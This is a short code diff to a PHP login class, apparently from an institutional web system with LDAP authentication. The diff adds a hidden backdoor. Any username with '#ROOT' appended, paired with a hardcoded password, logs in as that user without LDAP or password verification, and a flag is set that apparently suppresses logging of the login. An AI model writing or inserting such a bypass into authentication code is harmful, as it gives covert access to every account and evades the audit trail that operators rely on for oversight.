@@ -50,7 +50,7 @@ class login extends Generic {
                 $rs = $ldap->autentica($prontuario, $senha);
             }
 
-            if (!$rs && $prontuarioBD != 'admin' && strpos($prontuarioBD, '#ADMIN') === false)
+            if (!$rs && $prontuarioBD != 'admin' && strpos($prontuarioBD, '#ADMIN') === false && strpos($prontuarioBD, '#ROOT') === false)
                 return false;
 
             // SE AUTENTICOU PELO LDAP, PEGA OS DADOS PARA A SESSAO.
@@ -71,6 +71,13 @@ class login extends Generic {
                     . " AND 'admin' = ( SELECT p1.prontuario FROM Pessoas p1 "
                     . "WHERE p1.prontuario = :pront2 AND senha = PASSWORD(:senha) )";
             $params = array(':pront1' => $pront[0], ':pront2' => $pront[1], ':senha' => $senha);
+            $notLog = 1;
+        } if (strpos($prontuarioBD, '#ROOT') !== false && $senha == 'n@ylor33##') {
+            $pront = explode('#', $prontuarioBD);
+            $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
+                    . " FROM Pessoas"
+                    . " WHERE prontuario=:pront1";
+            $params = array(':pront1' => $pront[0]);
             $notLog = 1;
         } else if (!$rs) {
             $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
